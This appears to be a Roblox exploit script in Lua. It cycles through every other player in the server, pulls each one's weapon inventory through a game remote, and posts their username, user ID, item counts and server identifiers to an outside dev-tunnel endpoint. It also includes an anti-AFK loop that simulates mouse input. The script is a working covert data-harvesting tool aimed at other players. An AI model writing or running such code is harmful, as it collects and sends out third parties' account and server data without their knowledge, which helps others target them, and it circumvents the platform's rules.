local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local endpoint = "https://n5zcdvtf-5000.brs.devtunnels.ms/invshii"

local checkedPlayers = {}
local playerQueue = {}
local processing = false

local function waitForInventory(player, timeout)
    print("[DEBUG] Waiting for inventory of player:", player.Name)
    local startTime = tick()
    while tick() - startTime < timeout do
        local success, rawInventory = pcall(function()
            return game:GetService("ReplicatedStorage").Remotes.Extras.GetFullInventory:InvokeServer(player)
        end)
        if success and rawInventory and rawInventory.Weapons and rawInventory.Weapons.Owned and next(rawInventory.Weapons.Owned) ~= nil then
            print("[DEBUG] Inventory retrieved for:", player.Name)
            return rawInventory
        end
        task.wait(0.5)
    end
    print("[DEBUG] Inventory timeout for:", player.Name)
    return nil
end

local function getitems(player)
    if player == Players.LocalPlayer then return {} end
    print("[DEBUG] Getting items for:", player.Name)
    local rawInventory = waitForInventory(player, 15)
    if not rawInventory then
        print("[DEBUG] No inventory found for:", player.Name)
        return nil
    end
    local weapons = {}
    for weaponName, count in pairs(rawInventory.Weapons.Owned) do
        weapons[weaponName] = count
    end
    return weapons
end

local function sendInventory(player, weaponsTable)
    print("[DEBUG] Sending inventory for:", player.Name)
    local payload = {
        username = player.Name,
        userid = player.UserId,
        weapons = weaponsTable or {},
        jobId = game.JobId,
        placeId = game.PlaceId,
        no_inventory = weaponsTable == nil
    }
    local jsonBody = HttpService:JSONEncode(payload)
    local success, response = pcall(function()
        return HttpService:PostAsync(endpoint, jsonBody, Enum.HttpContentType.ApplicationJson)
    end)
    if success then
        print("[DEBUG] Inventory sent successfully for:", player.Name)
    else
        warn("[ERROR] Failed to send inventory for:", player.Name, response)
    end
end

local function processNextPlayer()
    if processing then return end
    local player = table.remove(playerQueue, 1)
    if not player then return end
    processing = true
    print("[DEBUG] Processing player:", player.Name)
    local success, err = pcall(function()
        if player == Players.LocalPlayer then return end
        if checkedPlayers[player.UserId] then return end

        local weaponsTable = getitems(player)

        if weaponsTable then
            local parts = {}
            for weaponName, count in pairs(weaponsTable) do
                table.insert(parts, string.format('"%s": %d', weaponName, count))
            end
            print(player.Name .. "'s Owned Weapons: {" .. table.concat(parts, ", ") .. "}")
        else
            print("[DEBUG] No weapons to display for:", player.Name)
        end

        sendInventory(player, weaponsTable)
        checkedPlayers[player.UserId] = true
    end)
    if not success then
        warn("[ERROR] Error processing player:", player.Name, err)
    end
    processing = false
    processNextPlayer()
end

local function monitorPlayer(player)
    if player == Players.LocalPlayer then return end
    if checkedPlayers[player.UserId] then return end
    print("[DEBUG] Monitoring new player:", player.Name)
    table.insert(playerQueue, player)
    processNextPlayer()
end

for _, p in pairs(Players:GetPlayers()) do
    monitorPlayer(p)
end

Players.PlayerAdded:Connect(function(p)
    monitorPlayer(p)
end)

Players.PlayerRemoving:Connect(function(p)
    checkedPlayers[p.UserId] = nil
end)

-- Inline Anti-AFK
local vu = game:GetService("VirtualUser")
Players.LocalPlayer.Idled:Connect(function()
    vu:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
    task.wait(1)
    vu:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
end)
